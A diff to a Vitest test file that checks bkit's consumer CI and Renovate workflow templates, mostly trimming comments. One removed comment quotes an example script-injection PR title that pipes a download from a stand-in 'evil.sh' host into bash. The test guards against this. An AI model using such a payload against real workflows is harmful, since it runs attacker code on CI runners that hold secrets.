@@ -65,11 +65,9 @@ describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () =
 
   describe("[verbose ci] NODE_OPTIONS knob", () => {
     // The runner blocklists NODE_OPTIONS for the $GITHUB_ENV workflow command and REJECTS
-    // the write with an ::error:: while still concluding the step `success` — so the shape
-    // below ships a knob that reaches nothing on a run that goes green. Only static YAML
-    // works. These two assertions are a pair: deleting the rejected write on its own would
-    // leave the lanes quiet AND knob-less, which is worse than the bug, because the error
-    // annotation is the only thing pointing at it.
+    // the write with an ::error:: while still concluding the step `success`; only static
+    // YAML works. The two assertions are a pair: no $GITHUB_ENV write, and the static key
+    // present.
     it("never writes NODE_OPTIONS to $GITHUB_ENV", () => {
       const offenders = content
         .split("\n")
@@ -115,8 +113,7 @@ describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () =
     });
 
     it("fires only on dev pushes (not PRs, not other branches)", () => {
-      // The step's if: gates on a push to dev — that's the moment main starts
-      // to lag. Matching the exact guard keeps it from firing on PRs / feature pushes.
+      // The step's if: gates on a push to dev (exact guard; not PRs / feature pushes).
       expect(content).toMatch(
         /Check Default Branch Lags Dev[\s\S]*?if:[^\n]*github\.event_name == 'push'[^\n]*github\.ref == 'refs\/heads\/dev'/,
       );
@@ -135,9 +132,8 @@ describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () =
     });
 
     it("is token-free (default branch read at runtime, so the block is identical per repo)", () => {
-      // No bkit {{TOKEN}} inside the block — otherwise install would render it and the
-      // managed-block drift check would false-positive on every consumer. The default
-      // branch comes from the Actions context at runtime instead.
+      // No bkit {{TOKEN}} inside the block; the default branch comes from the Actions
+      // context at runtime.
       const block =
         content.match(/# bkit:start main-lag-warning\n[\s\S]*?# bkit:end main-lag-warning/)?.[0] ??
         "";
@@ -164,8 +160,7 @@ describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () =
     expect(content).toContain("davelosert/vitest-coverage-report-action");
     expect(content).toContain("# - name: Report Unit Coverage on PR");
     expect(content).toContain("# - name: Report Integration Coverage on PR");
-    // Neither is an ACTIVE (uncommented) step — that would run coverage before the consumer
-    // opts in (and without the required json-summary/json reporters + permissions).
+    // Neither is an ACTIVE (uncommented) step: coverage is opt-in.
     expect(content).not.toMatch(/^\s*- name: Report (Unit|Integration) Coverage on PR/m);
   });
 
@@ -201,10 +196,8 @@ describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () =
   });
 
   it("never inlines a PR title into a run: body (GitHub Actions script injection)", () => {
-    // A `${{ github.event.pull_request.title }}` expanded into shell text lets a PR titled
-    // `"; curl evil.sh | bash; "` run on the consumer's CI runner. User-controlled text MUST
-    // arrive via env: (runtime expansion, injection-safe). Guards the snapshot below from
-    // silently re-blessing a reintroduced inline interpolation.
+    // User-controlled text (`${{ github.event.pull_request.title }}`) arrives via env:
+    // (runtime expansion), never expanded into shell text.
     expect(content).not.toMatch(/MSG="\$\{\{\s*github\.event\.pull_request\.title\s*\}\}"/);
     expect(content).toContain("PR_TITLE: ${{ github.event.pull_request.title }}");
     expect(content).toMatch(/MSG="\$PR_TITLE"/);
@@ -228,8 +221,7 @@ describe("consumer renovate template (.bkit/templates/.github/renovate.json5)", 
   });
 
   it("merges base-branch config so dev-side renovate.json5 edits take effect", () => {
-    // Without useBaseBranchConfig, Renovate reads config ONLY from the default
-    // branch (main) — config edits on `dev` are silently ignored.
+    // useBaseBranchConfig: Renovate otherwise reads config ONLY from the default branch.
     expect(content).toMatch(/useBaseBranchConfig:\s*"merge"/);
   });
 
@@ -327,8 +319,7 @@ describe("consumer renovate template (.bkit/templates/.github/renovate.json5)", 
   it("scopes multi-package ecosystem groups to majors only (non-majors fold into the unified group)", () => {
     // vitest/playwright/tanstack non-major bumps ride the unified auto-merge PR;
     // only a coordinated MAJOR bump gets a dedicated lockstep PR (reviewed,
-    // never auto-merged). Guards against regressing to separate-named ecosystem
-    // groups that auto-merge non-majors and re-enter the lockfile cascade.
+    // never auto-merged).
     expect(content).toMatch(
       /matchPackageNames:\s*\[\s*"vitest\*"[\s\S]*?matchUpdateTypes:\s*\[\s*"major"\s*\][\s\S]*?automerge:\s*false/,
     );
@@ -387,7 +378,7 @@ describe("self-hosted renovate workflow template (.bkit/templates/.github/workfl
   });
 
   it("authenticates with BKIT_GH_TOKEN, never the default GITHUB_TOKEN", () => {
-    // GITHUB_TOKEN-opened PRs don't trigger CI, so platformAutomerge never fires (#325).
+    // GITHUB_TOKEN-opened PRs don't trigger CI, so platformAutomerge never fires.
     expect(content).toMatch(/token:\s*\$\{\{\s*secrets\.BKIT_GH_TOKEN\s*\}\}/);
     expect(content).not.toMatch(/token:\s*\$\{\{\s*secrets\.GITHUB_TOKEN\s*\}\}/);
     expect(content).not.toMatch(/token:\s*\$\{\{\s*github\.token\s*\}\}/);
@@ -411,8 +402,8 @@ describe("self-hosted renovate workflow template (.bkit/templates/.github/workfl
   });
 
   it("never INJECTS model/tracker secrets into the runner (security.md § token isolation)", () => {
-    // The names may appear in a "do NOT add these" comment, but must never be
-    // referenced as `secrets.*` (which would expose them to the Renovate runner).
+    // The names may appear in a "do NOT add these" comment, but are never referenced
+    // as `secrets.*`.
     expect(content).not.toMatch(/secrets\.ANTHROPIC_API_KEY/);
     expect(content).not.toMatch(/secrets\.BKIT_ANTHROPIC_API_KEY/);
     expect(content).not.toMatch(/secrets\.LINEAR_API_KEY/);
